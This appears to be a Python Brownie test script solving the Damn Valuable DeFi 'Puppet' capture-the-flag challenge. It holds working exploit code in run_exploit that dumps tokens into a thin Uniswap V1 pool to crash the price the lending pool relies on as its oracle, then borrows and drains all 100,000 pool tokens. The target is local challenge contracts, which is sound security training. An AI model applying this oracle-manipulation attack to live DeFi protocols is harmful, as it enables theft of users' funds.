from brownie import (
    accounts,
    Contract,
    DamnValuableToken,
    PuppetPool,
)
from brownie.convert.datatypes import Wei
from brownie.network.state import Chain
from decimal import *
from toolz.itertoolz import unique
from web3 import Web3
import json

# Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
UNISWAP_INITIAL_TOKEN_RESERVE = Web3.toWei("10", "ether")
UNISWAP_INITIAL_ETH_RESERVE = Web3.toWei("10", "ether")
POOL_INITIAL_TOKEN_BALANCE = Web3.toWei("100000", "ether")
ATTACKER_INITAL_TOKEN_BALANCE = Web3.toWei("1000", "ether")

ONE_ETH_IN_WEI = Web3.toWei("1", "ether")


def before():
    # setup scenario
    deployer = accounts[0]
    attacker = accounts[1]
    token = DamnValuableToken.deploy({"from": deployer})

    exchange_template = deploy_uniswap_contract("UniswapV1Exchange")
    factory = deploy_uniswap_contract("UniswapV1Factory")

    factory.initializeFactory(exchange_template.address, {"from": deployer})
    exchange_address = factory.createExchange(token.address, {"from": deployer})
    global dvt_uniswap_exchange
    dvt_uniswap_exchange = Contract.from_abi(
        "DVTUniswapExchange",
        exchange_address.events["NewExchange"]["exchange"],
        exchange_template.abi,
    )

    lending_pool = PuppetPool.deploy(
        token.address, dvt_uniswap_exchange.address, {"from": deployer}
    )
    token.approve(
        dvt_uniswap_exchange.address, UNISWAP_INITIAL_TOKEN_RESERVE, {"from": deployer}
    )

    chain = Chain()
    global deadline
    deadline = chain[-1].timestamp * 2

    dvt_uniswap_exchange.addLiquidity(
        0,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        deadline,
        {"from": deployer, "value": UNISWAP_INITIAL_ETH_RESERVE},
    )

    # ensure Uniswap exchange is working as expected
    assert dvt_uniswap_exchange.getTokenToEthInputPrice(
        ONE_ETH_IN_WEI
    ) == calculate_token_to_eth_input_price(
        ONE_ETH_IN_WEI, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE
    )

    token.transfer(attacker, ATTACKER_INITAL_TOKEN_BALANCE, {"from": deployer})
    token.transfer(lending_pool.address, POOL_INITIAL_TOKEN_BALANCE, {"from": deployer})

    assert lending_pool.calculateDepositRequired(1) == 2

    global initial_attacker_eth_balance
    initial_attacker_eth_balance = attacker.balance()


# Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
# Casting it to decimal to pass equality check.
def calculate_token_to_eth_input_price(
    tokens_sold, tokens_in_reserve, ether_in_reserve
):
    return (
        Decimal(tokens_sold)
        * 997
        * ether_in_reserve
        / (tokens_in_reserve * 1000 + tokens_sold * 997)
    )


def deploy_uniswap_contract(file_name):
    # NOTE; If you are on windows change the file structure accordingly... '\\'
    with open("build-uniswap/" + file_name + ".json") as json_file:
        data = json.load(json_file)
        abi = data["abi"]
        bytecode = data["evm"]["bytecode"]["object"]

    # deploys contract
    tx = accounts[0].transfer(data=bytecode)
    return Contract.from_abi(file_name, tx.contract_address, abi)
    

def run_exploit():
    # exploit: sell a lot of DVT token to the uniswap pool to make the price crash. 
    # Because the lending pool is using the uniswap pool as oracle, we will be able to borrow all DVT with a small deposit.

    # intiate variables
    deployer = accounts[0]
    attacker = accounts[1]
    token = DamnValuableToken[-1]
    lending_pool = PuppetPool[-1]
    
    # check the balance of the uniswap pool before the operations
    print(f'dvt_uniswap_exchange: {dvt_uniswap_exchange}')
    print(f'uniswap token balance before: {Web3.fromWei(token.balanceOf(dvt_uniswap_exchange.address), "ether")}')
    print(f'uniswap getTokenToEthInputPrice: {Web3.fromWei(dvt_uniswap_exchange.getTokenToEthInputPrice(ONE_ETH_IN_WEI), "ether")}')

    # compute the deposit required to empty the pool
    depositRequired = lending_pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
    print(f'puppetPool deposit require (before): {Web3.fromWei(depositRequired, "ether")}')

    # approve the attacker token to send it to the uniswap pool
    token.approve(dvt_uniswap_exchange.address, ATTACKER_INITAL_TOKEN_BALANCE, {"from": attacker})

    # sell all tokens to make the price crash
    tx = dvt_uniswap_exchange.tokenToEthSwapInput(ATTACKER_INITAL_TOKEN_BALANCE, 1, deadline, {'from': attacker})

    # check the balance of the uniswap pool after the operations
    print(f'tokenToEthSwapInput return: {tx.return_value}')
    print(f'uniswap token balance after: {Web3.fromWei(token.balanceOf(dvt_uniswap_exchange.address), "ether")}')
    print(f'uniswap getTokenToEthInputPrice: {Web3.fromWei(dvt_uniswap_exchange.getTokenToEthInputPrice(ONE_ETH_IN_WEI), "ether")}')

    # compute the deposit required to empty the pool
    depositRequired = lending_pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
    print(f'puppetPool deposit require (after): {Web3.fromWei(depositRequired, "ether")}')

    # borrow as much DVT as possible from thew puppet pool
    lending_pool.borrow(POOL_INITIAL_TOKEN_BALANCE, {'from': attacker, 'value': depositRequired})

def after():
    attacker = accounts[1]
    assert (
        DamnValuableToken[0].balanceOf(attacker.address) >= POOL_INITIAL_TOKEN_BALANCE
    )
    assert DamnValuableToken[-1].balanceOf(PuppetPool[-1].address) == 0

def test_puppet_challenge():
    before()
    run_exploit()
    after()
